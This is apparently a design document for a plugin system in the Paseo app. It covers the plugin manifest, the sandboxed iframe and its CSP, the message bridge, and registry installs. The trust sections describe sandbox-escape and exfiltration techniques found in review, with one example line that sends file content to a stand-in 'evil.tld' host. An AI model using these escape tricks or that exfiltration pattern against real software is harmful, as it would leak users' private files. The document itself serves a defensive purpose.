# Plugins

Plugins extend Paseo's UI without a Paseo release. A plugin contributes a file preview or a sidebar panel; the daemon installs and serves it, the client renders it in a sandbox.

This doc owns the plugin contract: the manifest, the sandbox, the host bridge, and the registry. For adding an agent backend instead, read [providers.md](providers.md).

## What a plugin is

A directory under `$PASEO_HOME/plugins/<id>/` containing a `paseo-plugin.json` manifest and one self-contained HTML file per contribution.

```
$PASEO_HOME/plugins/
├── installed.json          # enabled state and install source, daemon-owned
└── csv-table/
    ├── paseo-plugin.json
    └── preview.html
```

```json
{
  "id": "csv-table",
  "name": "CSV Table",
  "version": "1.0.0",
  "description": "Render CSV and TSV files as a sortable table.",
  "author": "you",
  "license": "MIT",
  "paseoVersion": ">=0.2.6",
  "contributes": {
    "filePreviews": [
      { "id": "table", "title": "Table", "extensions": [".csv", ".tsv"], "entry": "preview.html" }
    ],
    "sidebarPanels": [{ "id": "pet", "title": "Pet", "icon": "cat", "entry": "pet.html" }]
  }
}
```

Schemas are in `packages/protocol/src/plugin/types.ts` and are the source of truth for what parses.

### One HTML file per contribution

An entry is a flat `*.html` filename in the plugin directory. No subdirectories, no separate JS or CSS files, no images on disk. Bundle everything into the HTML.

This is the constraint that keeps the rest of the system small: there is no asset server, no path resolution, no traversal surface, and no MIME handling. The daemon reads one file and sends its text.

Bundle with whatever you like; `esbuild --bundle --minify` into an inline `<script>` is enough.

## The sandbox

Plugin HTML never runs in the app's own context. The client renders it in a sandboxed frame with no network and no storage:

| Platform      | Host                                                                                              |
| ------------- | ------------------------------------------------------------------------------------------------- |
| Web, Electron | `<iframe sandbox="allow-scripts" srcDoc=...>` — opaque origin                                     |
| iOS, Android  | the same iframe, inside a host document in `react-native-webview`; navigation denied on top of it |

One sandbox model, not two. The WebView used to load the plugin as its own top document, and that made native the odd one out in a way that took four review rounds to see: with no `sandbox` attribute anywhere, a frame the plugin creates _inherits_ the parent's origin instead of getting a fresh opaque one. Parent and child are then same-origin, so `frames[0].RTCPeerConnection` is readable synchronously — in the same task as the insertion, before any runtime cleanup gets a turn. On web that line throws, and only because `sandbox="allow-scripts"` mints an opaque origin for the child.

So native now loads a trivial host document that embeds the identical sandboxed iframe and relays `postMessage` to the native bridge. Everything below applies to every platform.

All platforms get the same injected CSP: `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'; base-uri 'none'; frame-src 'none'; object-src 'none'`. That stops `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, remote images, remote fonts, and forms, and a plugin cannot read cookies or reach the daemon except through the bridge below. Images and fonts are allowed from `data:` and `blob:`, which carry no request. `frame-src 'none'` does not stop nested frames — `about:srcdoc` is exempt from it — which is why they are removed at runtime instead.

`form-action` and `base-uri` are listed explicitly because neither falls back to `default-src`, so a form POST would otherwise be an open exfiltration path.

### WebRTC has no CSP directive, so the shell deletes it

`default-src 'none'` does not cover `RTCPeerConnection`, and no directive does — Chromium treats `webrtc` as unrecognised and sends the packets anyway. A plugin picks the ICE server's host, port, username and credential, so a single STUN/TURN Allocate carries a few hundred bytes of its choosing to a server of its choosing; the hostname alone is enough for DNS exfiltration with nothing listening.

`wrapPluginHtml` therefore emits a script, before any plugin markup, that deletes `RTCPeerConnection` and its vendor aliases from the realm and redefines them non-configurable.

A deletion only covers the realm it ran in, and that is the trap. A plugin that appends an `<iframe srcdoc="...">` gets a brand new realm with `RTCPeerConnection` intact, and there is no way to inject into it: `about:srcdoc` is exempt from `frame-src`, and without `allow-same-origin` the child is cross-origin so its `contentWindow` is unreachable. Reading `child.contentWindow.RTCPeerConnection` from the parent throws either way, which is why an assertion written that way looked like a denial and was not one — the attack runs _inside_ the child, and the child reports for itself.

So the plugin does not get child browsing contexts at all. The same script installs a `MutationObserver` that removes any `iframe`/`frame`/`object`/`embed` as it is inserted, which lands before the child document starts parsing and therefore before its inline script runs.

Three rounds of review found a door that observer does not watch, so it is now the last line rather than the only one. What sits above it:

- **The plugin's markup is inserted, never parsed as the document.** `wrapPluginHtml` carries the HTML as a JS string and hands it to `insertAdjacentHTML`, then re-creates the inline `<script>` elements in order. What that changes for a plugin author is under [Your HTML is inserted, not parsed as a document](#your-html-is-inserted-not-parsed-as-a-document). This is the one that is not negotiable: `<template shadowrootmode="closed">` is honoured by the HTML parser and by nothing else, and a closed shadow root built that way is unreachable from script forever — no `shadowRoot` to read, no `attachShadow` call to wrap, an `<iframe>` inside it that nothing can find. Fragment parsing leaves the same markup an inert `<template>`.
- **`document.write`, `document.writeln`, `setHTMLUnsafe`, and `Document.parseHTMLUnsafe` throw.** They are the remaining ways to reach the HTML parser, and therefore the remaining ways to a closed shadow root. Denying an API is a policy; removing an element afterwards is a race.
- **`attachShadow` is wrapped** so every root it hands out is observed and swept, and it forces `mode: "open"`. That call is the only moment a `closed` root is reachable, so a closed one that ever slipped the wrapper would be invisible to every later sweep; an open one leaves the `shadowRoot` scan a way back in. The wrapper's own `observe` call is a captured reference — a late lookup there was round 8's hole, since a plugin can no-op `MutationObserver.prototype.observe` before the wrapper ever runs. Round 9 was the other half of the same mistake: capturing the callee does nothing for the **argument**. A dictionary parameter is converted with one `Get` per member, so every member the object does not own is read off `Object.prototype`. `Object.prototype.attributeFilter = 1` made the sequence conversion throw and `observe` never ran; `Object.prototype.clonable = true` minted a shadow root from `cloneNode` with no `attachShadow` call to wrap. Every object the shell hands a web API is now null-prototype.

  Round 10 was the third instance: the helper that built those null-prototype objects read `Object.create` when it was **called**, and the wrapper calls it on every `attachShadow` — long after the plugin's script has run. Replace `Object.create` with one returning an accessor pair and `options.mode = "open"` goes nowhere, so the plugin gets the `closed`, `clonable` root the wrapper exists to deny. Hence the invariant in `bridge.ts`, which the three rounds widened one clause at a time: capture the callee, build the argument bare, and resolve nothing global at call time. The wrapper also re-reads `shadowRoot` after the fact and drops the host if it does not match, so a future miss fails closed rather than silently.

And two things the observer itself has to get right, each found by breaking an earlier version:

- **Observe `document`, not `document.documentElement`.** A post-load `document.write()` implies `document.open()`, which throws away the tree and builds a fresh `documentElement`. An observer bound to the old node is left watching something detached and never fires again, while the `<iframe>` written in that same call parses and runs.
- **Capture every method and accessor up front.** The plugin's script runs after ours, so anything resolved at mutation time is something it can replace: with `Element.prototype.remove = function(){}` the observer still fires and quietly does nothing. Non-configurable constructors buy little if the machinery enforcing the removal stays writable.

`sandbox-denial.browser.test.ts` has the child report `typeof RTCPeerConnection` from its own realm and asserts the report never arrives — for the plain append, the poisoned prototypes, `document.write`, an imperative shadow root in all three attachment orders, and a declarative closed one. A denial test written from the host's point of view proves nothing here: reading `child.contentWindow.RTCPeerConnection` throws on the opaque origin either way.

There is no CSP or Permissions Policy answer to any of this. WebRTC is not a policy-controlled feature in any browser, so it cannot be withheld from a frame tree the way `camera` or `microphone` can — the realm has to not exist.

### Resource hints leak a hostname, and one of them is not closed

`<link rel="dns-prefetch">` and `<link rel="preconnect">` resolve a hostname without making a request, so no CSP directive is ever consulted — the payload rides in the subdomain labels. It is the same DNS channel `RTCPeerConnection` is deleted to close, reached with a `<link>` and no script. The other hint rels are fetches and `default-src 'none'` already refuses them.

A hint fires when the element is connected, synchronously, before any observer's microtask. Removing it afterwards is too late, so the shell never connects one:

- **Plugin markup is sanitised while it is still detached.** `insertAdjacentHTML` goes into a `<div>` that is not in the document, where nothing loads and no hint fires; every `link`, `iframe`, `frame`, `object` and `embed` is removed there, and only then is the subtree connected — as one fragment, so scripts still see their own siblings. Nothing legitimate is lost: CSP denies every resource a `<link>` could fetch anyway. This does not reach inside a `<template>`, whose content is a separate fragment `querySelectorAll` does not descend into — a hint parked there and cloned later by a script is the residual below, not a second hole.
- **`x-dns-prefetch-control: off`** is on both shells, which disables `dns-prefetch` for the whole document including hints a plugin script adds later. There is no CSP equivalent. It is a response header, but the `<meta http-equiv>` form is honoured: Blink dispatches it in `third_party/blink/renderer/core/loader/http_equiv.cc` to `Document::ParseDNSPrefetchControlHeader`. Nothing observable from JS tells you whether it took, so there is no test for it — it is defence in depth under the strip above, not a control the design rests on.

**Residual:** a plugin _script_ can still append `<link rel="preconnect">` and cause one DNS lookup and TCP/TLS connection to a host of its choosing. No web platform primitive denies it — CSP has no directive, `x-dns-prefetch-control` is a separate Blink setting that does not cover preconnect, and the hint fires before any interception we can install universally. Wrapping the dozen DOM insertion APIs would be incomplete by construction, which is the failure mode the rest of this section exists to avoid. Treat an installed plugin as code you trust with the files you open in it, the same as a VS Code extension; the sandbox stops a _careless_ plugin, not a determined one with a covert channel.

The CSP is injected by wrapping the plugin's HTML in our own document shell, never by locating the plugin's own `<head>`. Searching attacker-controlled markup for an injection point is defeated by putting `<head>` in a comment or an attribute, which ships the document with no policy at all.

On native, `originWhitelist` is `["*"]`. That looks backwards and isn't: react-native-webview consults the whitelist _before_ the navigation callback and hands non-matching URLs to `Linking.openURL`, which opens them in the user's real browser. Widening the whitelist is what routes every navigation through our own deny-by-default check.

Deliberately absent from the iframe sandbox: `allow-same-origin` (would give the plugin an origin and therefore storage and same-origin reach), `allow-popups`, `allow-top-navigation`, `allow-forms`, `allow-modals`.

### The host document carries a policy too

The guest CSP cannot stop the plugin navigating _itself_. `navigate-to` was dropped from the spec, and `default-src` does not cover a document's own navigation — so `location.href = "https://evil.tld/?d=" + content` leaves from inside the frame with the policy intact.

What stops it is `frame-src 'none'` on the **host** document, because a child frame's navigation is checked against the parent's policy, not its own. `about:srcdoc` is exempt, so the plugin still renders. It is set in both places the app HTML is served: `packages/server/src/server/web-ui.ts` (header) and `packages/app/public/index.html` (meta, which is what Electron's `paseo://` handler and the Expo dev server deliver). `setupSubframeNavigationPrevention()` in the desktop window manager is a second line of defence on `will-frame-navigate`.

Native's host document uses the same `PLUGIN_CONTENT_SECURITY_POLICY` constant, not a copy trimmed to what the host needs. A `srcdoc` frame inherits its parent's policy and the effective one is the intersection, so anything the host omits it also takes away from the plugin — an earlier hand-written copy dropped `img-src`, and every data-URL image died on iOS and Android and nowhere else.

A blocked navigation does not leave the plugin running: Chromium replaces the frame with an empty document. The plugin stops working and later host `postMessage`s go nowhere. That is the intended failure — fail closed, not fail quiet.

That includes in-page anchors. `<a href="#section">` is a frame navigation, so clicking one blanks the plugin. Scroll with `scrollIntoView()` instead; do not put `href="#..."` in plugin HTML.

No `iframe`, `frame`, `object`, or `embed` either — they are removed as they are inserted. Use inline `<svg>` or `<img src="data:…">`.

And `document.write`, `document.writeln`, `element.setHTMLUnsafe()`, and `Document.parseHTMLUnsafe()` throw. Build with `innerHTML`, `insertAdjacentHTML`, or DOM calls.

Electron's in-app browser `<webview>` is unaffected; it is not a frame navigation and never reaches either gate.

## The host bridge

One `postMessage` channel. Every message is `{ paseo: 1, type, ... }`; anything else is ignored.

Host to plugin:

| Message  | When                       | Carries                                                    |
| -------- | -------------------------- | ---------------------------------------------------------- |
| `init`   | after the plugin's `ready` | `context` (see below) and `theme` (resolved design tokens) |
| `update` | context or theme changed   | the same `context` and `theme` shapes                      |

`update` carries the theme so a light/dark switch reaches a plugin that is already open. Re-read both fields on every `update` rather than only on `init`.

Listen on `window` and check `message.paseo === 1`. Do not check `event.origin` or `event.source`: the sender differs by platform (the app frame on web, the host document on native) and the origin is `"null"` in a sandboxed frame anyway.

Plugin to host:

| Message     | Effect                                                   |
| ----------- | -------------------------------------------------------- |
| `ready`     | plugin has listeners attached; host replies with `init`  |
| `open-file` | `{ path, lineStart? }` — opens the file in the file pane |

`path` must be workspace-relative and stay inside the workspace. Absolute paths, `~`-relative paths, and `../` escapes are rejected at the bridge. Without that check a plugin can declare a preview for `.npmrc` or `.pem`, ask the host to open one, and be handed the secret as its own render context.

`context` for a file preview is `{ kind: "file-preview", path, content }`. For a sidebar panel it is `{ kind: "sidebar-panel", cwd, workspaceId }`.

Sending `lineStart` opens the file in the built-in code view, not in your plugin: a plugin has no way to scroll to a line, so jumping to one has to leave the plugin. Omit it if you want the user to stay.

The bridge is intentionally this small. A plugin gets the content it was opened on and one navigation verb. It does not get the daemon client, the agent timeline, or the filesystem. Widening it is a product decision, not a plumbing one.

## Contribution points

**File preview.** The file pane resolves a preview by extension. A plugin preview wins over the built-in syntax-highlighted view for extensions it claims, and the user can switch back from the file pane toolbar. Two plugins claiming the same extension resolve alphabetically by plugin id; the loser is reported in Settings.

**Sidebar panel.** One extra tab in the explorer sidebar next to Changes, Files, and PR. Every plugin tab renders the same generic icon; the manifest's `icon` is parsed but not honoured, because honouring it means bundling the whole icon set to satisfy a name only known at runtime.

Both live behind the `plugins` capability flag on `server_info.features`. An old daemon means no plugins UI at all, not a degraded one.

## Installing

Three paths, all landing in the same directory:

- **Registry.** Settings → Plugins → Browse. The daemon fetches the registry index, and installing downloads each file and verifies its SHA-256 against the index before writing.
- **CLI.** `paseo plugin browse` lists the registry, `paseo plugin install <id>` installs from it, plus `ls`, `enable`, `disable`, `uninstall`.
- **By hand.** Drop a directory into `$PASEO_HOME/plugins/` and restart the daemon, or hit `paseo plugin ls` which rescans. This is how you develop one. It has to be a real directory — a symlink to one elsewhere is skipped, silently, because the scan does not follow links.

The registry index defaults to `https://plugins.paseo.sh/index.json` and is overridable with `daemon.plugins.registryUrl` in `config.json` so you can self-host or point at a file during development.

A plugin whose `paseoVersion` does not match, whose manifest stopped parsing, or whose entry file is missing stays listed with an `unavailableReason` instead of disappearing. Silent disappearance is worse than a visible broken row.

### Self-hosting an index

`plugins.paseo.sh` does not exist yet and there is no submission process, so hosting your own index is how you get a plugin to other people. It is one JSON file at any URL a daemon can reach:

```json
{
  "version": 1,
  "plugins": [
    {
      "manifest": { "id": "hello-paseo", "...": "the plugin's paseo-plugin.json, verbatim" },
      "files": [
        {
          "name": "preview.html",
          "url": "https://example.com/hello-paseo/1.0.0/preview.html",
          "sha256": "5f2c…",
          "bytes": 1843
        }
      ],
      "publishedAt": "2026-01-01T00:00:00Z",
      "installs": 0
    }
  ]
}
```

What the daemon enforces, and why it is worth knowing before you publish rather than after:

- **Every file URL is `https:`.** A `file:` URL is accepted only when the index itself is a `file:` URL, which is the development case.
- **`sha256` and `bytes` both have to match**, and the download is aborted mid-stream once it passes `bytes` — a CDN that streams more than the entry declares fails the install rather than filling the daemon's heap. Re-hash and re-measure on every publish; a stale hash is the most common broken listing.
- **`files` holds 1 to 64 entries and 8 MiB total.** The count is capped separately from the bytes: an entry declaring thousands of tiny files stays inside the byte budget while the daemon walks the whole list.
- **`name` is a flat `*.html` filename**, and every entry a contribution names has to be listed or the install is refused before anything is written.
- **A malformed entry loses its own listing, not the registry's.** The index envelope is parsed loosely and each entry strictly, so one bad plugin does not take the index offline — which also means a publisher's plugin can vanish from Browse with the reason only in the daemon log.

Point a daemon at it with `daemon.plugins.registryUrl` in `config.json`. The daemon caches the index for five minutes; Browse's refresh forces past that.

## Trust

Installing a plugin means trusting whoever published it with what the bridge exposes: the content of files you preview with it, and the ability to ask the app to open a path inside the workspace.

Six mechanisms keep that content on the machine, and all six have to hold:

1. the guest CSP denies network requests it can express,
2. the document shell deletes `RTCPeerConnection`, which the CSP cannot express,
3. the shell denies every route to a fresh realm, because one gets its own `RTCPeerConnection` back: plugin markup is inserted rather than parsed, the parser APIs throw, `attachShadow` is wrapped, and frames are removed as they are inserted,
4. `frame-src 'none'` on the host document denies the frame navigating itself,
5. the iframe has no `allow-forms`/`allow-popups`/`allow-top-navigation`/`allow-same-origin`, on every platform,
6. the native WebView denies every navigation off the plugin document.

All six were found broken during review, across six rounds: a regex-placed CSP; an `originWhitelist` that bypassed our own navigation check; the self-navigation hole that survived the first round of fixes; WebRTC — reproduced against a real TURN server that received the file content verbatim; WebRTC again one frame deeper, in a `srcdoc` child the deletion never reached; the frame remover itself, poisoned through the prototypes it looked things up on and detached by `document.write()`; and then the frame remover again, blind to a frame inside a shadow root. Every one passed typecheck, lint, and the full test suite.

Note the shape of those. The round-three fix was itself incomplete. The test written to prove it asserted the wrong thing. The round-four fix could be disabled by the plugin from inside, and the round-five one could be walked around. A denial test has to be driven from where the attacker's code runs; a runtime mitigation has to assume the attacker will attack the mitigation; and control #3 got to six rounds because it was a list of doors rather than a policy, which is why it is now a policy with the list underneath it.

The native rework belongs on that list too, as a design fault rather than a bug: native ran the plugin as its own top document, so a frame it created inherited the parent's origin and could be read synchronously, in the same task as the insertion. Nothing racing a parser can cover that — hence the host document native now loads.

Treat any change to the sandbox as security-relevant, and prove the denial in a real browser rather than reasoning about the policy. `packages/app/src/plugins/sandbox-denial.browser.test.ts` reads the shipped CSP out of `public/index.html` and mounts a plugin that actually tries each escape. When you add a capability, add its escape attempt there first — the enumeration being incomplete is how all six shipped.

The daemon serves an entry only when its plugin is enabled and the entry is declared in the manifest's `contributes`, and it re-checks containment after resolving symlinks. A disabled plugin's code does not leave the daemon.

The registry operator is a trust boundary — the index says which bytes are the plugin. SHA-256 verification protects the download, not the publisher's intent. The installed manifest is the one embedded in the index rather than a separately hashed file, so it carries exactly the same trust as the hashes sitting next to it. Downloads are capped while streaming, not after buffering, so a host that declares a small size and streams gigabytes cannot exhaust daemon memory. See [SECURITY.md](../SECURITY.md).

The index is parsed one entry at a time and bad entries are dropped. Parsing it all-or-nothing means a single over-long description published to the registry takes the registry offline for every daemon already in the wild.

## Writing one

`examples/plugins/hello-paseo/` is a working plugin with both contribution kinds. Copy it, change the id, and point `daemon.plugins.registryUrl` at a local index to test the install path end to end.

### Your HTML is inserted, not parsed as a document

The shell hands your markup to `insertAdjacentHTML` and then re-creates your inline `<script>` elements in order, so the HTML parser never runs over it. Inline scripts still run in order and still run before `DOMContentLoaded`, with their attributes intact and `document.currentScript` pointing where you expect. What differs:

- **`<script type="module">` runs after the classic scripts**, not in document order. That is module semantics, not a quirk, but the ordering is new if you were relying on a document parse.
- **A script sees the whole document**, not only the markup above it. `getElementById` for an element further down now returns it.
- **`<script src="...">` does nothing.** `script-src 'unsafe-inline'` denies external scripts anyway; inline your code.
- **Declarative shadow DOM does nothing.** `<template shadowrootmode>` stays an inert `<template>`. `attachShadow()` works, but always hands back an **open** root: `mode: "closed"` is ignored, so `element.shadowRoot` is readable. Nothing else about it changes — `delegatesFocus`, `slotAssignment`, `clonable` and `serializable` are forwarded, and a missing or invalid argument throws exactly as it would without the wrapper.
- **No `<head>` semantics.** Your `<html>`/`<head>` tags are dropped. `<style>` works fine in the body; `<meta>` and `<base>` do nothing.
- **`<link>`, `<iframe>`, `<frame>`, `<object>` and `<embed>` are removed**, silently and whatever the attributes say. Nothing they could load is reachable — the CSP denies external stylesheets, scripts and frames, and even a `data:` stylesheet, so a `<link>` never worked here. Inline your CSS in a `<style>`. The reasons are under [Resource hints](#resource-hints-leak-a-hostname-and-one-of-them-is-not-closed) and above it.
- **Non-script `<script>` blocks are left alone**, so `type="application/json"` data blocks survive and are not executed. Every `type` the parser treats as JavaScript still runs, including the legacy ones (`text/jscript`, `application/x-javascript`).

`shell.browser.test.ts` is the contract, in real Chromium.
